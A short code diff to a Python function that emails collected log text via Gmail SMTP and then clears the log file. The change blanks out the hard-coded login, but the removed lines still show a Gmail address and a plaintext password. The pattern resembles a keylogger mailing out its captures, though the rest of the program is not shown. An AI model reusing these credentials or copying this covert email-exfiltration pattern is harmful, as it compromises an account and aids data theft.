@@ -34,8 +34,8 @@ def report(ip_adress, log_text):
     msgObject = smtplib.SMTP('smtp.gmail.com', 587)
 
     msgObject.starttls()
-    msgObject.login('s1dal3x@gmail.com', 'pointblank24')
-    msgObject.sendmail('123@gmail.com', 's1dal3x@gmail.com', report_text.encode('utf8'))
+    msgObject.login('-----------', '------------')
+    msgObject.sendmail('--------------', '------------', report_text.encode('utf8'))
     msgObject.quit()
     f = open(LOG_NAME, 'w').close()
     log.clear()
